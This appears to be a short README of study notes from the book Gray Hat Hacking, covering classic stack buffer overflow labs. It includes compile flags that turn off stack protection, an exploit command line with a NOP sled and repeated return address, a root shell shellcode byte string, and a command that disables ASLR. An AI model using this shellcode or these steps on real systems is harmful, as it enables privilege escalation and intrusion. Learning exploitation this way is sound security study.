Grayshell
=========

Some basic shell code, when I learn &lt;Gray Hat Hacking>


#How to run 

##Example1 : Buffer_overflow
//notice we start out at user privileges "$"

```
gcc overflow.c -ggdb -mpreferred-stack-boundary=2 -fno-stack-protector -o overflow
``` 

```
$gdb -g overflow 
(gdb) run
(gdb) info req eip
(gdb) q
```

##Example2 : Meet.c
//notice we start out at user privileges "$"

```
gcc meet.c -ggdb -mpreferred-stack-boundary=2 -fno-stack-protector -z execstack -o meet
``` 
//notice the difference between ` and '

```
./meet Mr `perl -e 'print "A" x 600'`
```
```
ESP: 0xbffffc58

0xbffffc58 - 0x300 = 0xbffff958

perl -e 'print "\x58\xf9\xff\xff"x38'

```
```
./meet Mr `perl -e 'print "\x90"x200';``cat sc``perl -e 'print "\x58\xf9\xff\xff"x38';`
```






##Example3 : Shellcode.c
```
gcc -ggdb -mpreferred-stack-boundary=2 -fno-stack-protector -z execstack -o shellcode shellcode.c
```
```
\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh
```

##Example4 : Repeat return address

```
gcc -o get_sp get_sp.c
```

### forbidden ASLR
```
echo "0" > /proc/sys/kernel/randomize_va_space 

ESP: 0xbffffc58


``` 

## peercast 
```
http://peercast.sourcearchive.com/downloads/0.1214.toots.svn20051112/
```
